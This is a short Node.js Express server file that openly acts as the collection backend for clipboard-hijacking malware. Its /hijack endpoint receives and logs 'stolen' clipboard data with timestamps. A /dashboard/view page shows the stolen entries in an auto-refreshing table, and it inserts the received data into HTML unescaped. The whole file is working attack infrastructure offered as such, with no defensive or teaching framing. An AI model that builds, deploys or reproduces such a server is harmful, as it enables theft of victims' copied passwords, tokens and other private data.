const express = require("express");
const cors = require("cors");
const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());

// Store stolen clipboard data with timestamps
let hijackedData = [];

app.post("/hijack", (req, res) => {
    const { stolenData } = req.body;

    // Add the stolen clipboard data to the array with a timestamp
    const timestamp = new Date().toISOString();
    hijackedData.push({ data: stolenData, timestamp: timestamp });

    console.log("📌 Hijacked Clipboard Data:", { data: stolenData, timestamp: timestamp });
    res.status(200).json({ message: "Clipboard data successfully received" });
});

app.get("/dashboard/view", (req, res) => {
    let html = `
        <h1>Hijacked Clipboard Data</h1>
        <table border="1" style="width: 100%; text-align: left;">
            <tr>
                <th>Timestamp</th>
                <th>Data</th>
            </tr>
    `;
    hijackedData.forEach(entry => {
        html += `<tr>
                    <td>${entry.timestamp}</td>
                    <td>${entry.data}</td>
                 </tr>`;
    });
    html += `
        </table>
        <script>
            setTimeout(() => {
                window.location.reload();
            }, 3000); // Refresh every 3 seconds to update data
        </script>
    `;
    res.send(html);
});

// Start the server
app.listen(port, () => {
    console.log(`📌 Clipboard hijacking server running at http://localhost:${port}`);
});
